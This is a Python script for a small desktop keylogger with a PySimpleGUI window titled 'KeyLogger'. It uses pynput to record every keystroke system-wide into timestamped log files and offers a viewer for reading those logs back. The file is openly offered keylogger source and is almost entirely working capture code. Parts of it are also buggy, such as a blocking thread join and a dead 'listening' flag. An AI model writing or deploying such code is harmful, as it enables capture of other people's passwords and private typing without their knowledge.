import PySimpleGUI as sg
import os 
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime
import threading

listening = False




def twoWindow():
    listen_=False
    cc = os.getcwd()
    clear = False
    files = os.listdir(f"{cc}/logs")
    layout = [
        [sg.T("Choose a Log to look at:")],[sg.Listbox(files,size=(30,20), key="-files"),sg.MLine(key='-ML1-'+sg.WRITE_ONLY_KEY, size=(30,20))],
        [sg.B("Open"), sg.Button("Clear"), sg.Button("Exit")],
        [sg.Button('Listen to Keys'),sg.T("", key="-listening")]]

    window = sg.Window('KeyLogger', layout)
    while True:
        event, values = window.read()
        if event == sg.WIN_CLOSED:
            break
        if event=="Clear":
            clear = True

        if event == 'Open':
            filex = values["-files"]
            cc = os.getcwd()
            file = open(f"{cc}/logs/{filex[0]}", "r")
            lines = file.readlines()
            for index,line in enumerate(lines):
                window['-ML1-'+sg.WRITE_ONLY_KEY].print(line, end="")

        if event == 'Listen to Keys':

            def listen():
                def dString():
                    xtime = datetime.utcnow()
                    time_string = f"keylog[{xtime.month}.{xtime.day}.{xtime.year}..{xtime.hour}:{xtime.minute}.{xtime.second}{xtime.microsecond}]"
                    return time_string
                logging.basicConfig(filename=(f"logs/{dString()}"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
                def on_press(key):
                    print(str(key))
                    keystring = f"{key}"
                    logging.info(keystring)
                with Listener(on_press=on_press) as listener:
                    listener.join()
                    if listening == False:
                        False
            
            if listen_!=True:
                t2=threading.Thread(target=listen)
                t2.start()
                t2.join()
            
    window.close()
    if listen_ == True:
        t2.join()
        global listening
        listening = False
    if clear == True:
        return clear
        
    


def recycle():
    x = twoWindow()
    return x

if __name__ == '__main__':

    t1 = threading.Thread(target=twoWindow)

    while True:
        x = twoWindow()
        if x == True:
            x = recycle()
        else:break

